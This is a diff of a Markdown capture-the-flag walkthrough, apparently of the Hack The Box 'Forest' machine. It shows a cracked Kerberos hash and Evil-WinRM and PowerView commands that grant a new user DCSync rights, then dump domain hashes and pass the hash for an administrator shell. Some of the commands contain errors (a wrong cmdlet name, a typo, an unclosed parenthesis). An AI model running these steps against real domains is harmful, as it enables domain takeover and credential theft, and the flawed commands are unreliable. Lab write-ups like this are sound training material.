@@ -165,7 +165,6 @@ Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD
 Will run 6 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
 s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
-
 ```
 
 ### Shell
@@ -199,15 +198,24 @@ WriteDacl can be exploited to give access to DCSync, Which can allow the owned u
    ![New User](https://mitchelldstein.github.io/assets/images/Forest/NewUser.png)
 2. Upload Powerview.ps1, which can be found [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 
-   ```shell
-   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload <path-to-file>/PowerView.ps1
+   ```powershell
+   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload PowerView.ps1
    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module PowerView.ps1
    ```
 
 3. Perform the DCsync exploit with PowerView.ps1 (Both $SecPassword and user password must be the same)
 
-   ```shell
-   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-String '
-   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
-   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
+   ```powershell
+   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-String 'Password123!' -AsPlainText -Force
+   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Managemnt.Automation.PSCredential('HTB\Craz3', $SecPAssword
+   *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity Craz3 -Rights DCSync
    ```
+
+4. Exploit DCSync with Impacket-SecretsDump using the username and password of your new created user to gather the user hashes.
+   ![SecretsDump](https://mitchelldstein.github.io/assets/images/Forest/SecretsDump.png)
+
+## Passing the hash
+
+Using the new Administrator hash, you can perform a "Pass the Hash" attack. This uses the hash of the user to authenticate instead of a password. This will give us an administrator shell.
+
+![PassTheHash](https://mitchelldstein.github.io/assets/images/Forest/PassTheHash.png)
